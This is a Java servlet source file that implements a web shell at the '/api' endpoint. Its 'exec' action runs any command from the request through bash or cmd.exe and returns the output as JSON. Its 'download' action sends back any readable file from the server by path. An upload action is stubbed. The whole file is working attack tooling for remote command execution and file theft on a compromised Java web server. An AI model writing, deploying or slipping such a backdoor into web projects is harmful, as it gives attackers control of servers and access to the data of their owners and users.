package com.podalirius;

import org.apache.commons.lang3.SystemUtils;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.Writer;
import java.util.Map;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import org.json.JSONException;
import org.json.JSONObject;


@WebServlet("/api")
public class MyServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String action = request.getParameter("action");

        if (action.equals("exec")) {
            String cmd = request.getParameter("cmd");
            action_exec(response, cmd);
        } else if (action.equals("download")) {
            String path = request.getParameter("path");
            action_download(response, path);
        } else if (action.equals("upload")) {
            // TODO
            // String path = request.getParameter("path");
            // action_upload(response, path);
        }
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String action = request.getParameter("action");

        if (action.equals("exec")) {
            String cmd = request.getParameter("cmd");
            action_exec(response, cmd);
        } else if (action.equals("download")) {
            String path = request.getParameter("path");
            action_download(response, path);
        } else if (action.equals("upload")) {
            // TODO
            // String path = request.getParameter("path");
            // action_upload(response, path);
        }
    }

    private void action_exec(HttpServletResponse response, String cmd) throws IOException {
        Writer writer = response.getWriter();
        String stdout = "";
        String stderr = "";
        String linebuffer = "";

        String[] commands = {"/bin/bash", "-c", cmd};

        if (SystemUtils.IS_OS_WINDOWS) {
            commands[0] = "cmd.exe";
            commands[1] = "/c";
        } else if (SystemUtils.IS_OS_AIX) {
            commands[0] = "/bin/ksh";
            commands[1] = "/c";
        } else if (SystemUtils.IS_OS_LINUX) {
            commands[0] = "/bin/bash";
            commands[1] = "-c";
        } else if (SystemUtils.IS_OS_MAC) {
            commands[0] = "/bin/dash";
            commands[1] = "-c";
        }

        try {
            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec(commands);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            // Read the output from the command
            while ((linebuffer = stdInput.readLine()) != null) { stdout += linebuffer+"\n"; }
            // Read any errors from the attempted command
            while ((linebuffer = stdError.readLine()) != null) { stderr += linebuffer+"\n"; }
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            JSONObject result = new JSONObject();
            result.put("exec", commands);
            result.put("stdout", stdout);
            result.put("stderr", stderr);
            response.addHeader("Content-Type", "application/json");
            result.write(writer);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private void action_download(HttpServletResponse response, String path) throws IOException {
        if (path == null) {
            try {
                Writer writer = response.getWriter();
                JSONObject result = new JSONObject();
                result.put("action", "download");
                result.put("error", "Missing 'path' argument in http request.");
                response.addHeader("Content-Type", "application/json");
                result.write(writer);
            } catch(Exception jsonerr) {
                jsonerr.printStackTrace();
            }
        } else {
            try {
                File f = new File(path);
                if (f.exists()) {
                    if (f.isFile()) {
                        if (f.canRead()) {
                            response.setContentType("application/octet-stream");
                            response.setHeader("Content-Disposition", "attachment;filename=\"" + f.getName() + "\"");
                            FileInputStream fileInputStream = new FileInputStream(path);
                            ServletOutputStream httpResponse = response.getOutputStream();
                            byte[] buffer = new byte[1024];
                            while (fileInputStream.available() > 0) {
                                fileInputStream.read(buffer);
                                httpResponse.write(buffer);
                            }
                            httpResponse.flush();
                            httpResponse.close();
                            fileInputStream.close();
                        } else {
                            try {
                                Writer writer = response.getWriter();
                                JSONObject result = new JSONObject();
                                result.put("action", "download");
                                result.put("error", "File " + path + " exists but is not readable.");
                                response.addHeader("Content-Type", "application/json");
                                result.write(writer);
                            } catch (JSONException jsonerr) {
                                jsonerr.printStackTrace();
                            }
                        }
                    } else {
                        try {
                            Writer writer = response.getWriter();
                            JSONObject result = new JSONObject();
                            result.put("action", "download");
                            result.put("error", "Path " + path + " is not a file (maybe a directory or a pipe).");
                            response.addHeader("Content-Type", "application/json");
                            result.write(writer);
                        } catch (JSONException jsonerr) {
                            jsonerr.printStackTrace();
                        }
                    }
                } else {
                    try {
                        Writer writer = response.getWriter();
                        JSONObject result = new JSONObject();
                        result.put("action", "download");
                        result.put("error", "Path " + path + " does not exist or is not readable.");
                        response.addHeader("Content-Type", "application/json");
                        result.write(writer);
                    } catch(JSONException jsonerr) {
                        jsonerr.printStackTrace();
                    }
                }
            } catch (Exception err) {
                try {
                    Writer writer = response.getWriter();
                    JSONObject result = new JSONObject();
                    result.put("action", "download");
                    result.put("error", err.getMessage());
                    response.addHeader("Content-Type", "application/json");
                    result.write(writer);
                } catch (Exception jsonerr) {
                    jsonerr.printStackTrace();
                }
            }
        }
    }
}
